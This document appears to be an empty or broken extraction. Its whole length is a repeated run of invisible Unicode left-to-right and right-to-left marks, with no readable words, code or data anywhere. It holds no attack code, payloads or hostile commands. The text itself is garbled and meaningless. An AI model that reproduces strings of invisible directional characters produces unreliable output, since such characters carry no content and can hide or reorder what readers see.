‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎